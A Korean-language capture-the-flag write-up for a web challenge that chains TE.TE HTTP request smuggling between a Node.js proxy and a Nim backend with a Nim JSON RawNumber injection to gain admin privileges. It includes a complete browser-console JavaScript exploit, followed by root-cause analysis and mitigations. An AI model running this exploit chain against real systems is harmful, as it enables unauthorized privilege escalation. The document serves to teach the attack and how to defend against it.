# Login System Write-up

## 1. Overview

* **Target Challenge:** Login System
* **Category:** Web Hacking
* **Key Concept:** TE.TE HTTP Request Smuggling / Nim RawNumber JSON Injection / Privilege Escalation
* **Presentation Script:** [Login System 발표 대본](Login%20System%20발표%20대본.md)

---

## 2. Vulnerability Analysis

### Endpoint

* `/register`
* `/login`
* `/change_password`
* `/_raw`
* `/flag`

### Service Flow

이 문제는 두 개의 웹 서버로 구성되어 있습니다.

```text
Browser
   ↓
Node.js Express Front-end (:3000)
   ↓  HTTP Proxy
Nim Login System (:5000)
   ↓
/users/<username>.json
```

Node.js 서버는 세션과 권한 검사를 담당하고, Nim 서버는 회원가입, 로그인, 비밀번호 변경 및 사용자 JSON 파일 저장을 담당합니다.

일반 사용자는 `guest.yaml` 또는 `user.yaml`의 권한만 갖기 때문에 `/change_password`와 `/flag`에 직접 접근할 수 없습니다. 최종 목표는 사용자 JSON의 `privilegeLevel` 값을 `admin`으로 변경하여 관리자 세션을 획득하는 것입니다.

### Source Code Analysis

#### `app.js` - 권한 검사

```javascript
const accessRequired = name => (req, res, next) => {
  if (req.privilege.access[name]) next()
  else res.status(403).json({error: 'Access denied'})
}
```

Express 서버는 현재 세션의 `privilegeLevel`에 대응하는 YAML 파일을 읽고, 각 엔드포인트에 접근할 수 있는지 검사합니다.

```yaml
# guest.yaml
privilegeLevel: guest
access:
  index: true
  register: true
  login: true
```

따라서 guest 상태에서는 `/change_password`에 직접 요청할 수 없습니다.

#### `app.js` - Nim 서버 프록시

```javascript
for (const proxyiedPath of ['/login', '/register', '/change_password']) {
  app.post(proxyiedPath, accessRequired(proxyiedPath.slice(1)), (req, res) => {
    const hreq = http.request(
      new URL(proxyiedPath, LOGIN_SYS).href,
      {method: req.method, headers: req.headers},
      hres => {
        // response 처리
      }
    )

    req.pipe(hreq)
  })
}
```

Node.js는 클라이언트의 HTTP 헤더와 요청 본문을 Nim 서버로 전달합니다. 이때 두 서버가 `Transfer-Encoding` 헤더를 서로 다르게 해석하는 점을 이용할 수 있습니다.

#### `app.js` - Raw HTTP 전달 기능

```javascript
app.post('/_raw', express.raw({
  type: 'application/octet-stream',
  limit: '64kb'
}), (req, res) => {
  const conn = net.connect(Number(PORT), '127.0.0.1', () => {
    conn.write(req.body)
  })
})
```

`/_raw`는 전달받은 바이트를 Node.js 서버의 로컬 TCP 포트로 다시 전송합니다. 따라서 브라우저의 `fetch()`가 직접 설정할 수 없는 `Transfer-Encoding` 헤더도 HTTP 요청 문자열 내부에 작성하여 전달할 수 있습니다.

### Vulnerability 1 - TE.TE HTTP Request Smuggling

Node.js는 HTTP 헤더 값을 대소문자 구분 없이 처리하므로 다음 값을 정상적인 Chunked Encoding으로 인식합니다.

```http
Transfer-Encoding: CHUNKED
```

반면 Nim 1.6.14의 `std/asynchttpserver`는 `chunked` 문자열을 대소문자까지 동일하게 비교합니다. 따라서 대문자 `CHUNKED`를 Chunked Encoding으로 인식하지 못합니다.

```text
Node.js : CHUNKED → Chunked Body로 처리
Nim     : CHUNKED → 일반 요청으로 처리
```

Node.js가 Chunked Body를 해제하여 Nim 서버로 전달하면, Nim은 Chunk 크기 줄을 잘못된 HTTP 요청으로 무시한 뒤 Body 내부의 다음 문자열을 새로운 요청으로 인식합니다.

```http
POST /change_password HTTP/1.0
Content-Length: ...
Content-Type: application/json

{...}
```

이를 통해 Express 권한 검사를 거치지 않고 Nim 서버의 `/change_password`를 직접 실행할 수 있습니다.

### Vulnerability 2 - Nim RawNumber JSON Injection

Nim의 `std/json`은 정수 범위를 초과하는 매우 큰 숫자를 `RawNumber`로 처리합니다. 내부적으로 문자열과 유사하게 저장하지만, JSON으로 다시 직렬화할 때 따옴표를 추가하지 않는 `isUnquoted` 상태를 유지합니다.

다음과 같이 큰 숫자를 비밀번호로 사용하여 계정을 등록합니다.

```json
{
  "privilegeLevel": "user",
  "username": "user12345678",
  "password": 1111111111111111111111111111111
}
```

이후 `/change_password`에서 다음 문자열을 새로운 비밀번호로 지정합니다.

```text
"peko","privilegeLevel":"admin"
```

비밀번호 노드의 문자열 값만 바뀌고 `isUnquoted` 상태는 그대로 남기 때문에, 사용자 파일을 다시 저장하면 다음과 같은 JSON이 만들어집니다.

```json
{
  "privilegeLevel": "user",
  "username": "user12345678",
  "password": "peko",
  "privilegeLevel": "admin"
}
```

동일한 키가 두 번 존재하지만 JSON 파서는 뒤쪽의 `privilegeLevel` 값을 최종 값으로 사용합니다. 따라서 해당 계정으로 로그인하면 Express 세션의 권한이 `admin`으로 설정됩니다.

### Attack Flow

```text
1. 큰 숫자를 비밀번호로 사용하여 일반 계정 등록
                  ↓
2. Transfer-Encoding: CHUNKED 파서 차이 발생
                  ↓
3. /change_password 요청을 Nim 서버로 Smuggling
                  ↓
4. RawNumber 직렬화 특성을 이용하여 JSON 속성 주입
                  ↓
5. privilegeLevel을 admin으로 변경
                  ↓
6. 관리자 로그인 후 /flag 접근
```

---

## 3. Proof of Concept (PoC)

대상 페이지의 브라우저 개발자 도구에서 `F12`를 누르고 `Console` 탭에 다음 코드를 실행합니다. `BASE`에는 문제 서버 주소를 입력합니다.

```javascript
(async () => {
  const BASE = 'http://TARGET:PORT'.replace(/\/$/, '');
  const RAW_PASSWORD = '1111111111111111111111111111111';
  const FINAL_PASSWORD = 'peko';
  const encoder = new TextEncoder();

  async function request(path, options = {}) {
    return fetch(BASE + path, {
      ...options,
      credentials: 'include'
    });
  }

  async function postJSON(path, body) {
    const response = await request(path, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body
    });

    const text = await response.text();
    if (!response.ok) {
      throw new Error(`${path}: HTTP ${response.status}\n${text}`);
    }

    const result = JSON.parse(text);
    if (!result.success) {
      throw new Error(`${path}: ${text}`);
    }
    return result;
  }

  const random = crypto.getRandomValues(new Uint8Array(8));
  const username = 'user' + [...random]
    .map(value => value.toString(16).padStart(2, '0'))
    .join('');

  console.log('[1/4] Register:', username);

  // RAW_PASSWORD가 따옴표 없는 큰 숫자로 전달되도록 직접 JSON 구성
  const registerBody =
    `{"privilegeLevel":"user",` +
    `"username":${JSON.stringify(username)},` +
    `"password":${RAW_PASSWORD}}`;

  await postJSON('/register', registerBody);

  console.log('[2/4] Request smuggling');

  const injection =
    `"${FINAL_PASSWORD}","privilegeLevel":"admin"`;

  const changeBody =
    `{"username":${JSON.stringify(username)},` +
    `"old_password":${RAW_PASSWORD},` +
    `"new_password":${JSON.stringify(injection)}}`;

  const smuggledRequest =
    'POST /change_password HTTP/1.0\r\n' +
    `Content-Length: ${encoder.encode(changeBody).length}\r\n` +
    'Content-Type: application/json\r\n' +
    '\r\n' +
    changeBody;

  const chunkedBody =
    encoder.encode(smuggledRequest).length.toString(16) +
    '\r\n' +
    smuggledRequest +
    '\r\n0\r\n\r\n';

  const rawRequest =
    'POST /login HTTP/1.1\r\n' +
    `Host: ${new URL(BASE).host}\r\n` +
    'Content-Type: application/json\r\n' +
    'Transfer-Encoding: CHUNKED\r\n' +
    'Connection: keep-alive\r\n' +
    '\r\n' +
    chunkedBody;

  const rawResponse = await request('/_raw', {
    method: 'POST',
    headers: {'Content-Type': 'application/octet-stream'},
    body: encoder.encode(rawRequest)
  });

  await rawResponse.arrayBuffer();

  if (!rawResponse.ok) {
    throw new Error(`/_raw: HTTP ${rawResponse.status}`);
  }

  console.log('[3/4] Admin login');

  const login = await postJSON(
    '/login',
    JSON.stringify({
      username,
      password: FINAL_PASSWORD
    })
  );

  if (login.data?.privilegeLevel !== 'admin') {
    throw new Error(
      'Privilege escalation failed:\n' +
      JSON.stringify(login, null, 2)
    );
  }

  console.log('[4/4] Get flag');

  const flagResponse = await request('/flag');
  const flag = await flagResponse.text();

  if (!flagResponse.ok) {
    throw new Error(`/flag: HTTP ${flagResponse.status}\n${flag}`);
  }

  console.log(
    '%cFLAG: ' + flag.trim(),
    'color:#00d26a;font-size:20px;font-weight:bold'
  );
})().catch(error => console.error('Exploit failed:', error));
```

---

## 4. Execution & Result

브라우저 콘솔에서 PoC를 실행하면 다음 순서로 공격이 진행됩니다.

```text
[1/4] Register
[2/4] Request smuggling
[3/4] Admin login
[4/4] Get flag
```

Request Smuggling과 JSON Injection이 성공하면 관리자 세션이 생성되고, `/flag` 응답이 브라우저 콘솔에 출력됩니다.

![FLAG Result](login-system-flag.png)

---

## 5. Root Cause

이 문제는 하나의 취약점이 아니라 서로 다른 계층의 해석 차이를 연결하여 발생합니다.

1. **HTTP 파서 불일치**

   Node.js와 Nim이 `Transfer-Encoding: CHUNKED`를 다르게 처리하여 요청 경계가 달라집니다.

2. **백엔드의 독립적인 권한 검증 부재**

   `/change_password`의 권한 검사가 Express 서버에만 존재하고 Nim 서버에는 없습니다. 따라서 프록시 계층을 우회하면 보호된 기능을 직접 실행할 수 있습니다.

3. **RawNumber 상태를 유지한 값 변경**

   Nim JSON 노드의 문자열 내용만 수정하면서 `isUnquoted` 속성이 유지되어 JSON 구조 자체를 주입할 수 있습니다.

4. **중복 JSON 키 허용**

   `privilegeLevel`이 중복되어도 요청을 거부하지 않고 마지막 값을 사용하므로 권한 값이 `admin`으로 덮어써집니다.

---

## 6. Mitigation

### HTTP 요청 정규화

프론트엔드와 백엔드가 동일한 HTTP 파싱 규칙을 사용해야 합니다. 비표준 또는 모호한 `Transfer-Encoding` 값은 프록시 단계에서 거부해야 합니다.

```javascript
const transferEncoding = req.headers['transfer-encoding'];

if (transferEncoding && transferEncoding !== 'chunked') {
  return res.status(400).end();
}
```

### 백엔드 권한 검증

프론트엔드에서 이미 검사했더라도 민감한 기능을 실행하는 Nim 서버에서 인증 및 권한을 다시 검증해야 합니다. 내부 네트워크 요청이라는 이유만으로 신뢰해서는 안 됩니다.

### JSON 값 재생성

기존 JSON 노드의 내부 문자열 필드를 직접 수정하지 말고, 새로운 문자열 노드를 생성하여 교체해야 합니다.

```nim
user["password"] = %newPassword
```

또한 비밀번호 필드는 반드시 JSON 문자열인지 검사해야 합니다.

```nim
if data["password"].kind != JString:
  errorJSON "password must be a string"
  return
```

### 중복 JSON 키 거부

보안에 사용되는 `privilegeLevel`과 같은 필드가 중복된 입력은 파싱 단계에서 거부해야 합니다. 권한 값은 사용자 파일에서 직접 신뢰하지 않고 서버 측의 별도 저장소에서 관리하는 것이 안전합니다.

---

## 7. Takeaways

* **서로 다른 HTTP 파서를 연결할 때 Request Smuggling 위험이 발생할 수 있음**

  각 서버가 개별적으로 정상 동작하더라도 요청 경계를 다르게 판단하면 보호된 요청을 백엔드로 밀어 넣을 수 있습니다.

* **프론트엔드의 권한 검증만 신뢰해서는 안 됨**

  프록시 우회, SSRF 또는 Request Smuggling이 발생할 수 있으므로 실제 기능을 수행하는 백엔드에서도 권한을 검증해야 합니다.

* **데이터 타입 검증이 중요함**

  비밀번호처럼 문자열이어야 하는 필드에 숫자 타입을 허용하면 언어와 라이브러리의 예외적인 직렬화 동작을 공격에 이용할 수 있습니다.

* **파싱과 직렬화의 왕복 결과를 검증해야 함**

  파싱된 객체의 내부 상태를 변경한 뒤 다시 직렬화할 때 원래 입력과 다른 구조가 만들어질 수 있습니다.

* **중복 키를 보안 값에 사용하면 안 됨**

  JSON 구현마다 첫 번째 값 또는 마지막 값을 선택하는 방식이 다를 수 있으므로, 중복 키가 포함된 입력은 명시적으로 거부하는 것이 안전합니다.
